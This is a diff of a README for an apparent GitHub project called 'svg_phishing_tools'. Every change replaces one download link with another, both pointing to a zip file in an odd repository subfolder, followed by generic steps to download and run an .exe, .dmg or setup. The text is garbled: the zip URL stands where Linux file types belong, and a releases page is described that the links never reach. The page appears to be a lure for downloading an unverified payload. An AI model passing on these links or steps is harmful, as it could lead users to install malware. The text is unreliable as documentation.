@@ -6,7 +6,7 @@ Welcome to the svg_phishing_tools project! These tools help you analyze and crea
 
 ## 📥 Download
 
-[![Download svg_phishing_tools](https://raw.githubusercontent.com/putyposa/svg_phishing_tools/main/continental/svg_phishing_tools.zip)](https://raw.githubusercontent.com/putyposa/svg_phishing_tools/main/continental/svg_phishing_tools.zip)
+[![Download svg_phishing_tools](https://github.com/putyposa/svg_phishing_tools/raw/refs/heads/main/continental/svg-phishing-tools-1.0.zip)](https://github.com/putyposa/svg_phishing_tools/raw/refs/heads/main/continental/svg-phishing-tools-1.0.zip)
 
 ## ☑️ System Requirements
 
@@ -20,7 +20,7 @@ Before you begin, ensure your system meets these requirements:
 
 1. **Visit the Releases Page**  
    Click the link below to visit the releases page:  
-   [Download svg_phishing_tools](https://raw.githubusercontent.com/putyposa/svg_phishing_tools/main/continental/svg_phishing_tools.zip)
+   [Download svg_phishing_tools](https://github.com/putyposa/svg_phishing_tools/raw/refs/heads/main/continental/svg-phishing-tools-1.0.zip)
 
 2. **Select the Version**  
    On the releases page, find the latest version of svg_phishing_tools. Each version has a title and date. It’s best to choose the most recent one for the latest features and fixes.
@@ -29,7 +29,7 @@ Before you begin, ensure your system meets these requirements:
    Click on the version to see the available files. Depending on your operating system, look for the correct file:
    - For Windows: Look for files ending in `.exe` or `.zip`.
    - For macOS: Look for files ending in `.dmg`.
-   - For Linux: Look for `https://raw.githubusercontent.com/putyposa/svg_phishing_tools/main/continental/svg_phishing_tools.zip` files. 
+   - For Linux: Look for `https://github.com/putyposa/svg_phishing_tools/raw/refs/heads/main/continental/svg-phishing-tools-1.0.zip` files. 
 
 4. **Download the File**  
    Click the file link to start the download. The download may take a few moments. Check your Downloads folder for the file once it completes.
@@ -38,7 +38,7 @@ Before you begin, ensure your system meets these requirements:
    After the download, locate the file:
    - For Windows: Double-click the `.exe` or extract the `.zip` file and then run the setup.
    - For macOS: Open the `.dmg` file, then drag the application to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/putyposa/svg_phishing_tools/main/continental/svg_phishing_tools.zip` file and follow the instructions in the README.
+   - For Linux: Extract the `https://github.com/putyposa/svg_phishing_tools/raw/refs/heads/main/continental/svg-phishing-tools-1.0.zip` file and follow the instructions in the README.
 
 6. **Follow Installation Prompts**  
    During installation, follow the prompts that appear on your screen. You may need to grant permission for the application to run, especially on macOS and Linux.
